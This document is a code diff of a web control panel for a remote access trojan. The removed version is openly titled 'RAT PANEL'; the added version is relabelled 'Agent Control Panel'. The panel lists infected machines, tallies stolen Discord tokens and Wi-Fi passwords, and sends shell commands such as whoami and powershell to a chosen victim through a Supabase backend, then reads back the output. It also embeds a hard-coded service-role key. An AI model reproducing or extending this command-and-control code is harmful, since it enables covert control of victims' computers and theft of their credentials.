@@ -1,159 +1,268 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Panel · Agent Manager</title>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { background: #0a0a0a; color: #ccc; font-family: 'Segoe UI', monospace; }
-::-webkit-scrollbar { width: 4px; }
-::-webkit-scrollbar-thumb { background: #00ff8844; }
-
-/* Auth */
-#auth-container { height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; }
-.auth-box { background: #111; border: 1px solid #00ff8822; padding: 40px; width: 320px; border-radius: 4px; }
-.auth-box h2 { color: #0f0; margin-bottom: 20px; text-align: center; }
-.auth-box input { background: #1a1a1a; border: 1px solid #333; color: #0f0; padding: 10px; width: 100%; margin: 10px 0; font-family: monospace; }
-.auth-box input:focus { outline: none; border-color: #0f0; }
-.btn { background: #1a1a1a; border: 1px solid #00ff8844; color: #0f0; padding: 10px 20px; cursor: pointer; font-family: monospace; font-size: 12px; transition: 0.2s; }
-.btn:hover { background: #00ff8811; border-color: #0f0; }
-.btn-danger { border-color: #ff444488; color: #f44; }
-.btn-danger:hover { background: #ff444411; border-color: #f44; }
-.btn-accent { border-color: #0f0; background: #00ff8811; }
-
-/* App */
-#app-container { display: none; }
-.topbar { background: #0a0a0a; border-bottom: 1px solid #00ff8822; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
-.logo { color: #0f0; font-size: 14px; letter-spacing: 4px; font-weight: bold; }
-.user-info { font-size: 11px; color: #888; }
-.main { padding: 30px; }
-
-/* Stats */
-.stats-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-bottom: 30px; }
-.stat-card { background: #111; border: 1px solid #222; padding: 20px; text-align: center; border-radius: 4px; }
-.stat-number { font-size: 32px; color: #0f0; font-weight: bold; }
-.stat-label { font-size: 10px; color: #666; margin-top: 5px; letter-spacing: 2px; }
-
-/* Command Panel */
-.command-panel { background: #111; border: 1px solid #00ff8822; padding: 20px; margin-bottom: 30px; border-radius: 4px; }
-.command-header { color: #0f0; margin-bottom: 15px; font-size: 12px; }
-.command-input-group { display: flex; gap: 10px; flex-wrap: wrap; }
-.command-input { flex: 1; background: #1a1a1a; border: 1px solid #333; color: #0f0; padding: 12px; font-family: monospace; font-size: 12px; }
-.command-input:focus { outline: none; border-color: #0f0; }
-.cmd-output { background: #000; border: 1px solid #222; margin-top: 15px; padding: 12px; font-size: 11px; max-height: 200px; overflow-y: auto; color: #0a0; font-family: monospace; }
-
-/* Filters */
-.filters { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
-.filter-input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 8px 12px; font-size: 11px; width: 180px; }
-
-/* Agent Grid */
-.agent-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 15px; margin-top: 20px; }
-.agent-card { background: #111; border: 1px solid #222; padding: 15px; cursor: pointer; transition: 0.2s; border-radius: 4px; position: relative; }
-.agent-card:hover { border-color: #00ff8866; background: #151515; }
-.agent-card.selected { border-color: #0f0; background: #0f0a0a; }
-.agent-name { color: #0f0; font-size: 16px; font-weight: bold; display: flex; justify-content: space-between; }
-.agent-status { font-size: 10px; }
-.status-online { color: #0f0; }
-.status-offline { color: #f44; }
-.agent-details { font-size: 11px; color: #888; margin-top: 8px; line-height: 1.5; }
-.agent-actions { margin-top: 10px; display: flex; gap: 8px; justify-content: flex-end; }
-.agent-actions button { padding: 4px 12px; font-size: 10px; }
-
-/* Modal */
-.modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 1000; }
-.modal-content { background: #111; border: 1px solid #0f0; max-width: 800px; width: 90%; max-height: 80vh; overflow-y: auto; padding: 25px; border-radius: 4px; }
-.modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-.modal-header h3 { color: #0f0; }
-.close { cursor: pointer; color: #888; font-size: 20px; }
-.close:hover { color: #f44; }
-.modal pre { background: #000; padding: 15px; overflow-x: auto; font-size: 10px; color: #0a0; }
-
-/* Delete Confirm */
-.confirm-box { text-align: center; padding: 20px; }
-.confirm-box p { margin: 20px 0; color: #f44; }
-.confirm-buttons { display: flex; gap: 10px; justify-content: center; }
-
-/* Toast */
-#toast { position: fixed; bottom: 20px; right: 20px; background: #0f0a; border: 1px solid #0f0; padding: 10px 20px; font-size: 11px; display: none; z-index: 1001; color: #0f0; }
-
-.empty-msg { text-align: center; padding: 60px; color: #444; letter-spacing: 2px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Agent Control Panel</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0a0a0a; 
+            color: #ccc; 
+            font-family: 'Courier New', monospace; 
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        
+        /* Header */
+        .header { 
+            border-bottom: 1px solid #0f0; 
+            padding-bottom: 10px; 
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .title { color: #0f0; font-size: 20px; }
+        
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: #111;
+            border: 1px solid #333;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-number { font-size: 28px; color: #0f0; font-weight: bold; }
+        .stat-label { font-size: 10px; color: #666; margin-top: 5px; }
+        
+        /* Command Bar */
+        .command-bar {
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        .command-bar input {
+            background: #000;
+            border: 1px solid #333;
+            color: #0f0;
+            padding: 10px;
+            width: 70%;
+            font-family: monospace;
+        }
+        .command-bar button {
+            background: #1a1a1a;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 10px 20px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        .command-bar button:hover { background: #0f0; color: #000; }
+        .output {
+            background: #000;
+            border: 1px solid #333;
+            margin-top: 10px;
+            padding: 10px;
+            font-size: 11px;
+            max-height: 150px;
+            overflow-y: auto;
+            color: #0a0;
+        }
+        
+        /* Filters */
+        .filters {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .filters input {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 8px;
+            width: 200px;
+        }
+        .filters button {
+            background: #1a1a1a;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 8px 15px;
+            cursor: pointer;
+        }
+        
+        /* Agent Grid */
+        .agent-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 15px;
+        }
+        .agent-card {
+            background: #111;
+            border: 1px solid #222;
+            padding: 15px;
+            cursor: pointer;
+        }
+        .agent-card:hover { border-color: #0f0; }
+        .agent-card.selected { border-color: #0f0; background: #0f0a0a; }
+        .agent-name { color: #0f0; font-size: 16px; font-weight: bold; }
+        .agent-status { font-size: 10px; margin-left: 10px; }
+        .online { color: #0f0; }
+        .offline { color: #f44; }
+        .agent-details { font-size: 11px; color: #888; margin-top: 8px; }
+        .agent-actions { margin-top: 10px; display: flex; gap: 8px; justify-content: flex-end; }
+        .agent-actions button {
+            padding: 4px 12px;
+            font-size: 10px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #fff;
+            cursor: pointer;
+        }
+        .agent-actions button:hover { border-color: #0f0; color: #0f0; }
+        
+        /* Modal */
+        .modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #111;
+            border: 1px solid #0f0;
+            max-width: 800px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+        .close { cursor: pointer; color: #f44; }
+        pre {
+            background: #000;
+            padding: 10px;
+            overflow-x: auto;
+            font-size: 10px;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #0f0;
+            color: #000;
+            padding: 10px 20px;
+            display: none;
+        }
+        
+        .login-box {
+            max-width: 300px;
+            margin: 100px auto;
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 30px;
+            text-align: center;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #0f0;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background: #1a1a1a;
+            border: 1px solid #0f0;
+            color: #0f0;
+            cursor: pointer;
+        }
+        .error { color: #f44; font-size: 12px; margin-top: 10px; }
+    </style>
 </head>
 <body>
 
-<div id="auth-container">
-<div class="auth-box">
-<h2>⟡ RAT CONTROL ⟡</h2>
-<input type="email" id="login-email" placeholder="email" autocomplete="email">
-<input type="password" id="login-pass" placeholder="password" autocomplete="current-password">
-<div id="auth-error" style="color:#f44; font-size:10px; margin:10px 0"></div>
-<button class="btn" onclick="doLogin()" style="width:100%">SIGN IN</button>
-</div>
-</div>
-
-<div id="app-container">
-<div class="topbar">
-<div class="logo">[ RAT PANEL v3.0 ]</div>
-<div class="user-info"><span id="user-email"></span></div>
-<button class="btn" onclick="doLogout()" style="padding:5px 15px">EXIT</button>
+<div id="login-section">
+    <div class="login-box">
+        <h2 style="color:#0f0">AGENT CONTROL</h2>
+        <input type="email" id="email" placeholder="Email">
+        <input type="password" id="password" placeholder="Password">
+        <div id="login-error" class="error"></div>
+        <button onclick="login()">LOGIN</button>
+    </div>
 </div>
 
-<div class="main">
-<div class="stats-grid">
-<div class="stat-card"><div class="stat-number" id="stat-total">0</div><div class="stat-label">AGENTS</div></div>
-<div class="stat-card"><div class="stat-number" id="stat-online">0</div><div class="stat-label">ONLINE</div></div>
-<div class="stat-card"><div class="stat-number" id="stat-tokens">0</div><div class="stat-label">TOKENS</div></div>
-<div class="stat-card"><div class="stat-number" id="stat-wifi">0</div><div class="stat-label">WIFI</div></div>
-<div class="stat-card"><div class="stat-number" id="stat-cmds">0</div><div class="stat-label">COMMANDS</div></div>
+<div id="app-section" style="display:none">
+    <div class="container">
+        <div class="header">
+            <div class="title">[ AGENT CONTROL PANEL ]</div>
+            <div><span id="user-email"></span> <button onclick="logout()" style="margin-left:10px">EXIT</button></div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card"><div class="stat-number" id="stat-total">0</div><div class="stat-label">AGENTS</div></div>
+            <div class="stat-card"><div class="stat-number" id="stat-online">0</div><div class="stat-label">ONLINE</div></div>
+            <div class="stat-card"><div class="stat-number" id="stat-tokens">0</div><div class="stat-label">TOKENS</div></div>
+            <div class="stat-card"><div class="stat-number" id="stat-wifi">0</div><div class="stat-label">WIFI</div></div>
+            <div class="stat-card"><div class="stat-number" id="stat-cmds">0</div><div class="stat-label">COMMANDS</div></div>
+        </div>
+        
+        <div id="command-bar" class="command-bar">
+            <div><strong>TARGET:</strong> <span id="target-name">none</span></div>
+            <div style="margin-top:10px">
+                <input type="text" id="cmd-input" placeholder="whoami | ipconfig | dir C:\ | powershell Get-Process" onkeypress="if(event.key==='Enter') sendCommand()">
+                <button onclick="sendCommand()">EXECUTE</button>
+                <button onclick="clearOutput()">CLEAR</button>
+                <button onclick="deleteSelectedAgent()" style="border-color:#f44;color:#f44">DELETE</button>
+            </div>
+            <div id="cmd-output" class="output">> Ready. Select an agent.</div>
+        </div>
+        
+        <div class="filters">
+            <input type="text" id="filter-name" placeholder="Filter by PC name" onkeyup="filterAgents()">
+            <input type="text" id="filter-ip" placeholder="Filter by IP" onkeyup="filterAgents()">
+            <button onclick="fetchAgents()">REFRESH</button>
+            <button id="delete-filtered-btn" onclick="deleteFiltered()" style="display:none;border-color:#f44;color:#f44">DELETE FILTERED</button>
+        </div>
+        
+        <div id="agent-grid" class="agent-grid"></div>
+    </div>
 </div>
 
-<div class="command-panel" id="cmd-panel" style="display:none">
-<div class="command-header">🎯 TARGET: <span id="target-name" style="color:#0f0">none selected</span></div>
-<div class="command-input-group">
-<input type="text" id="cmd-input" class="command-input" placeholder="whoami | ipconfig | dir C:\ | powershell Get-Process | tasklist" onkeypress="if(event.key==='Enter') sendCommand()">
-<button class="btn" onclick="sendCommand()">EXECUTE</button>
-<button class="btn" onclick="clearOutput()">CLEAR</button>
-<button class="btn btn-danger" id="delete-agent-btn" onclick="deleteAgent()" style="display:none">DELETE AGENT</button>
-</div>
-<div id="cmd-output" class="cmd-output">> Ready. Select an agent to begin.</div>
+<div id="detail-modal" class="modal" onclick="if(event.target===this) closeModal()">
+    <div class="modal-content">
+        <div class="modal-header"><h3>AGENT DETAILS</h3><span class="close" onclick="closeModal()">[X]</span></div>
+        <div id="detail-content"></div>
+    </div>
 </div>
 
-<div class="filters">
-<input type="text" id="filter-name" class="filter-input" placeholder="Filter by PC name" onkeyup="filterAgents()">
-<input type="text" id="filter-ip" class="filter-input" placeholder="Filter by IP" onkeyup="filterAgents()">
-<button class="btn" onclick="fetchAgents()">⟳ REFRESH</button>
-<button class="btn btn-danger" id="delete-all-filtered-btn" onclick="deleteAllFiltered()" style="display:none">🗑 DELETE ALL FILTERED</button>
-</div>
-
-<div id="agent-container"></div>
-</div>
-</div>
-
-<div id="delete-modal" class="modal" onclick="if(event.target===this) closeDeleteModal()">
-<div class="modal-content">
-<div class="modal-header"><h3>⚠️ CONFIRM DELETE</h3><span class="close" onclick="closeDeleteModal()">✕</span></div>
-<div class="confirm-box"><p id="delete-message">Are you sure?</p><div class="confirm-buttons"><button class="btn" onclick="closeDeleteModal()">CANCEL</button><button class="btn btn-danger" id="confirm-delete-btn" onclick="confirmDelete()">DELETE</button></div></div>
-</div>
-</div>
-
-<div id="detail-modal" class="modal" onclick="if(event.target===this) closeDetailModal()">
-<div class="modal-content">
-<div class="modal-header"><h3>📋 AGENT DETAILS</h3><span class="close" onclick="closeDetailModal()">✕</span></div>
-<div id="detail-content"></div>
-</div>
-</div>
-
-<div id="toast"></div>
+<div id="toast" class="toast"></div>
 
 <script>
-// ============================================
-// USE ANON KEY (starts with eyJ...) - NOT service_role or secret key
-// Get this from: Supabase Dashboard -> Settings -> API -> Project API keys -> anon public
-// ============================================
+// ===== REPLACE THIS WITH YOUR REAL ANON KEY =====
 const SUPABASE_URL = "https://jojyzviwhosnnkjbtbse.supabase.co";
 const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Impvanl6dml3aG9zbm5ramJ0YnNlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3OTEzNTY5OCwiZXhwIjoyMDk0NzExNjk4fQ.JJmSBTBud2RVraJI0Bln26ZofK0xmMWWgaBzeAF5RMs";
+// ================================================
 
 const { createClient } = supabase;
 const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
@@ -162,49 +271,36 @@ let currentUser = null;
 let agents = [];
 let filteredAgents = [];
 let selectedAgent = null;
-let pendingDeleteId = null;
-let pendingDeleteAll = false;
-let cmdPollInterval = null;
+let pollInterval = null;
 
-// Auth
-async function doLogin() {
-    const email = document.getElementById('login-email').value;
-    const pass = document.getElementById('login-pass').value;
-    const { error } = await sb.auth.signInWithPassword({ email, password: pass });
-    if (error) document.getElementById('auth-error').innerText = error.message;
-    else location.reload();
+async function login() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const { error } = await sb.auth.signInWithPassword({ email, password });
+    if (error) {
+        document.getElementById('login-error').innerText = error.message;
+    } else {
+        location.reload();
+    }
 }
 
-async function doLogout() {
+async function logout() {
     await sb.auth.signOut();
     location.reload();
 }
 
-sb.auth.onAuthStateChange((event, session) => {
-    if (event === 'SIGNED_IN') { currentUser = session.user; showApp(); }
-    else if (event === 'SIGNED_OUT') showAuth();
-});
-
 async function checkSession() {
     const { data: { session } } = await sb.auth.getSession();
-    if (session) { currentUser = session.user; showApp(); }
-    else showAuth();
+    if (session) {
+        currentUser = session.user;
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('app-section').style.display = 'block';
+        document.getElementById('user-email').innerHTML = currentUser.email;
+        fetchAgents();
+        setInterval(fetchAgents, 15000);
+    }
 }
 
-function showAuth() {
-    document.getElementById('auth-container').style.display = 'flex';
-    document.getElementById('app-container').style.display = 'none';
-}
-
-function showApp() {
-    document.getElementById('auth-container').style.display = 'none';
-    document.getElementById('app-container').style.display = 'block';
-    document.getElementById('user-email').innerHTML = currentUser.email;
-    fetchAgents();
-    setInterval(fetchAgents, 10000);
-}
-
-// Agents
 async function fetchAgents() {
     const { data, error } = await sb.from('pc_reports').select('*').order('last_seen', { ascending: false });
     if (!error && data) {
@@ -224,25 +320,23 @@ function filterAgents() {
     });
     renderAgents();
     
-    const deleteAllBtn = document.getElementById('delete-all-filtered-btn');
+    const deleteBtn = document.getElementById('delete-filtered-btn');
     if (filteredAgents.length > 0 && (nameFilter || ipFilter)) {
-        deleteAllBtn.style.display = 'inline-block';
-        deleteAllBtn.textContent = `🗑 DELETE ${filteredAgents.length} FILTERED`;
+        deleteBtn.style.display = 'inline-block';
+        deleteBtn.innerText = `DELETE ${filteredAgents.length} FILTERED`;
     } else {
-        deleteAllBtn.style.display = 'none';
+        deleteBtn.style.display = 'none';
     }
 }
 
 function renderAgents() {
-    const container = document.getElementById('agent-container');
+    const grid = document.getElementById('agent-grid');
     if (!filteredAgents.length) {
-        container.innerHTML = '<div class="empty-msg">└ no agents connected ──[✗]──</div>';
+        grid.innerHTML = '<div style="text-align:center;padding:40px;color:#444">No agents connected</div>';
         return;
     }
     
-    container.innerHTML = '<div class="agent-grid"></div>';
-    const grid = container.querySelector('.agent-grid');
-    
+    grid.innerHTML = '';
     filteredAgents.forEach(agent => {
         const raw = agent.raw_specs || {};
         const lastSeen = agent.last_seen ? Math.floor((Date.now() - new Date(agent.last_seen)) / 60000) : 999;
@@ -251,26 +345,25 @@ function renderAgents() {
         
         const card = document.createElement('div');
         card.className = `agent-card ${isSelected ? 'selected' : ''}`;
+        card.onclick = () => selectAgent(agent.visitor_id, agent.pc_name);
         card.innerHTML = `
-            <div class="agent-name">
-                <span>💻 ${escapeHtml(agent.pc_name || 'unknown')}</span>
-                <span class="agent-status ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>
+            <div>
+                <span class="agent-name">💻 ${escapeHtml(agent.pc_name || 'unknown')}</span>
+                <span class="agent-status ${isOnline ? 'online' : 'offline'}">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>
             </div>
             <div class="agent-details">
                 👤 ${escapeHtml(agent.username || '?')}<br>
                 🌐 ${escapeHtml(agent.public_ip || agent.local_ip || '?')}<br>
-                📍 ${escapeHtml(raw.location || '?')}<br>
                 🔑 ${(raw.discord_tokens || []).length} tokens | 📶 ${(raw.wifi_passwords || []).length} wifi<br>
-                💻 ${escapeHtml(raw.cpu_name || '?').substring(0, 30)} | 💾 ${raw.ram_gb || agent.memory_gb || '?'}GB<br>
+                💾 ${raw.ram_gb || agent.memory_gb || '?'}GB | 🧠 ${raw.cpu_cores || agent.cpu_cores || '?'} cores<br>
                 ⏱️ ${lastSeen}m ago
             </div>
             <div class="agent-actions">
-                <button class="btn" onclick="event.stopPropagation(); showAgentDetail('${agent.id}')">DETAILS</button>
-                <button class="btn btn-accent" onclick="event.stopPropagation(); selectAgent('${agent.visitor_id}', '${escapeHtml(agent.pc_name)}')">CMD</button>
-                <button class="btn btn-danger" onclick="event.stopPropagation(); promptDeleteAgent('${agent.visitor_id}', '${escapeHtml(agent.pc_name)}')">DELETE</button>
+                <button onclick="event.stopPropagation(); showDetail('${agent.id}')">DETAILS</button>
+                <button onclick="event.stopPropagation(); selectAgent('${agent.visitor_id}', '${escapeHtml(agent.pc_name)}')">CMD</button>
+                <button onclick="event.stopPropagation(); deleteAgent('${agent.visitor_id}', '${escapeHtml(agent.pc_name)}')">DELETE</button>
             </div>
         `;
-        card.onclick = () => selectAgent(agent.visitor_id, agent.pc_name);
         grid.appendChild(card);
     });
 }
@@ -280,37 +373,32 @@ function updateStats() {
     const online = agents.filter(a => a.last_seen && (Date.now() - new Date(a.last_seen)) < 300000).length;
     document.getElementById('stat-online').innerText = online;
     
-    let totalTokens = 0, totalWifi = 0;
+    let tokens = 0, wifi = 0;
     agents.forEach(a => {
         const raw = a.raw_specs || {};
-        totalTokens += (raw.discord_tokens || []).length;
-        totalWifi += (raw.wifi_passwords || []).length;
+        tokens += (raw.discord_tokens || []).length;
+        wifi += (raw.wifi_passwords || []).length;
     });
-    document.getElementById('stat-tokens').innerText = totalTokens;
-    document.getElementById('stat-wifi').innerText = totalWifi;
+    document.getElementById('stat-tokens').innerText = tokens;
+    document.getElementById('stat-wifi').innerText = wifi;
+    
     updateCmdStats();
 }
 
 async function updateCmdStats() {
-    try {
-        const { count } = await sb.from('pc_commands').select('*', { count: 'exact', head: true });
-        document.getElementById('stat-cmds').innerText = count || 0;
-    } catch(e) {
-        document.getElementById('stat-cmds').innerText = '0';
-    }
+    const { count } = await sb.from('pc_commands').select('*', { count: 'exact', head: true });
+    document.getElementById('stat-cmds').innerText = count || 0;
 }
 
-// Command functions
 function selectAgent(id, name) {
     selectedAgent = id;
     document.getElementById('target-name').innerHTML = name;
-    document.getElementById('cmd-panel').style.display = 'block';
-    document.getElementById('delete-agent-btn').style.display = 'inline-block';
+    document.getElementById('command-bar').style.display = 'block';
     document.getElementById('cmd-input').focus();
     renderAgents();
     
-    if (cmdPollInterval) clearInterval(cmdPollInterval);
-    cmdPollInterval = setInterval(pollCommandOutput, 3000);
+    if (pollInterval) clearInterval(pollInterval);
+    pollInterval = setInterval(pollOutput, 3000);
 }
 
 async function sendCommand() {
@@ -318,9 +406,9 @@ async function sendCommand() {
     const cmd = document.getElementById('cmd-input').value.trim();
     if (!cmd) return;
     
-    const outputDiv = document.getElementById('cmd-output');
-    outputDiv.innerHTML += `\n> [${new Date().toLocaleTimeString()}] ${cmd}\n  ⏳ SENT...\n`;
-    outputDiv.scrollTop = outputDiv.scrollHeight;
+    const output = document.getElementById('cmd-output');
+    output.innerHTML += `\n> [${new Date().toLocaleTimeString()}] ${cmd}\n  ⏳ SENT...\n`;
+    output.scrollTop = output.scrollHeight;
     
     const { error } = await sb.from('pc_commands').insert({
         command_for: selectedAgent,
@@ -329,121 +417,90 @@ async function sendCommand() {
     });
     
     if (error) {
-        outputDiv.innerHTML += `  ❌ ERROR: ${error.message}\n`;
+        output.innerHTML += `  ❌ ERROR: ${error.message}\n`;
     } else {
         document.getElementById('cmd-input').value = '';
-        updateCmdStats();
         toast('Command sent');
+        updateCmdStats();
     }
 }
 
-async function pollCommandOutput() {
+async function pollOutput() {
     if (!selectedAgent) return;
-    try {
-        const { data, error } = await sb.from('pc_commands')
-            .select('*')
-            .eq('command_for', selectedAgent)
-            .eq('status', 'completed')
-            .order('created_at', { ascending: false })
-            .limit(3);
-        
-        if (!error && data && data.length) {
-            const outputDiv = document.getElementById('cmd-output');
-            for (const cmd of data.reverse()) {
-                const marker = `CMD_ID:${cmd.id}`;
-                if (!outputDiv.innerHTML.includes(marker)) {
-                    outputDiv.innerHTML += `\n📡 OUTPUT (${new Date(cmd.created_at).toLocaleTimeString()}):\n${cmd.output || '(no output)'}\n${'-'.repeat(50)}\n`;
-                    outputDiv.scrollTop = outputDiv.scrollHeight;
-                }
+    const { data } = await sb.from('pc_commands')
+        .select('*')
+        .eq('command_for', selectedAgent)
+        .eq('status', 'completed')
+        .order('created_at', { ascending: false })
+        .limit(3);
+    
+    if (data && data.length) {
+        const output = document.getElementById('cmd-output');
+        for (const cmd of data.reverse()) {
+            const marker = `CMD_${cmd.id}`;
+            if (!output.innerHTML.includes(marker)) {
+                output.innerHTML += `\n📡 OUTPUT (${new Date(cmd.created_at).toLocaleTimeString()}):\n${cmd.output || '(no output)'}\n${'-'.repeat(50)}\n`;
+                output.scrollTop = output.scrollHeight;
             }
         }
-    } catch(e) {}
+    }
 }
 
 function clearOutput() {
     document.getElementById('cmd-output').innerHTML = '> Ready.';
 }
 
-// Delete functions
-async function promptDeleteAgent(visitorId, pcName) {
-    pendingDeleteId = visitorId;
-    pendingDeleteAll = false;
-    document.getElementById('delete-message').innerHTML = `Delete agent <strong>${escapeHtml(pcName)}</strong> and all its data?<br>This cannot be undone.`;
-    document.getElementById('delete-modal').style.display = 'flex';
-}
-
-async function deleteAllFiltered() {
-    if (filteredAgents.length === 0) return;
-    pendingDeleteAll = true;
-    pendingDeleteId = null;
-    document.getElementById('delete-message').innerHTML = `Delete <strong>${filteredAgents.length}</strong> agents?<br>This cannot be undone.`;
-    document.getElementById('delete-modal').style.display = 'flex';
-}
-
-async function confirmDelete() {
-    if (pendingDeleteId) {
-        // Delete single agent
-        await sb.from('pc_reports').delete().eq('visitor_id', pendingDeleteId);
-        await sb.from('pc_commands').delete().eq('command_for', pendingDeleteId);
-        
-        toast(`Agent deleted`);
-        if (selectedAgent === pendingDeleteId) {
+async function deleteAgent(id, name) {
+    if (confirm(`Delete ${name} and all its data?`)) {
+        await sb.from('pc_reports').delete().eq('visitor_id', id);
+        await sb.from('pc_commands').delete().eq('command_for', id);
+        if (selectedAgent === id) {
             selectedAgent = null;
-            document.getElementById('cmd-panel').style.display = 'none';
+            document.getElementById('command-bar').style.display = 'none';
         }
+        toast('Agent deleted');
         await fetchAgents();
-        pendingDeleteId = null;
-    } else if (pendingDeleteAll) {
-        // Delete all filtered agents
-        const ids = filteredAgents.map(a => a.visitor_id);
-        for (const id of ids) {
-            await sb.from('pc_reports').delete().eq('visitor_id', id);
-            await sb.from('pc_commands').delete().eq('command_for', id);
-        }
-        toast(`Deleted ${ids.length} agents`);
-        if (selectedAgent && ids.includes(selectedAgent)) {
-            selectedAgent = null;
-            document.getElementById('cmd-panel').style.display = 'none';
-        }
-        await fetchAgents();
-        pendingDeleteAll = false;
     }
-    closeDeleteModal();
 }
 
-async function deleteAgent() {
+async function deleteSelectedAgent() {
     if (selectedAgent) {
-        promptDeleteAgent(selectedAgent, document.getElementById('target-name').innerHTML);
+        deleteAgent(selectedAgent, document.getElementById('target-name').innerHTML);
     }
 }
 
-function closeDeleteModal() {
-    document.getElementById('delete-modal').style.display = 'none';
-    pendingDeleteId = null;
-    pendingDeleteAll = false;
+async function deleteFiltered() {
+    if (filteredAgents.length === 0) return;
+    if (confirm(`Delete ${filteredAgents.length} agents?`)) {
+        for (const agent of filteredAgents) {
+            await sb.from('pc_reports').delete().eq('visitor_id', agent.visitor_id);
+            await sb.from('pc_commands').delete().eq('command_for', agent.visitor_id);
+        }
+        if (selectedAgent && filteredAgents.some(a => a.visitor_id === selectedAgent)) {
+            selectedAgent = null;
+            document.getElementById('command-bar').style.display = 'none';
+        }
+        toast(`Deleted ${filteredAgents.length} agents`);
+        await fetchAgents();
+    }
 }
 
-// Detail modal
-async function showAgentDetail(id) {
+async function showDetail(id) {
     const agent = agents.find(a => a.id == id);
     if (!agent) return;
-    const raw = agent.raw_specs || {};
-    document.getElementById('detail-content').innerHTML = `
-        <pre>${escapeHtml(JSON.stringify(raw, null, 2))}</pre>
-    `;
+    document.getElementById('detail-content').innerHTML = `<pre>${escapeHtml(JSON.stringify(agent.raw_specs || agent, null, 2))}</pre>`;
     document.getElementById('detail-modal').style.display = 'flex';
 }
 
-function closeDetailModal() {
+function closeModal() {
     document.getElementById('detail-modal').style.display = 'none';
 }
 
-// Utilities
 function toast(msg) {
     const t = document.getElementById('toast');
     t.innerText = msg;
     t.style.display = 'block';
-    setTimeout(() => t.style.display = 'none', 3000);
+    setTimeout(() => t.style.display = 'none', 2000);
 }
 
 function escapeHtml(str) {
@@ -451,7 +508,6 @@ function escapeHtml(str) {
     return String(str).replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));
 }
 
-// Start
 checkSession();
 </script>
 </body>
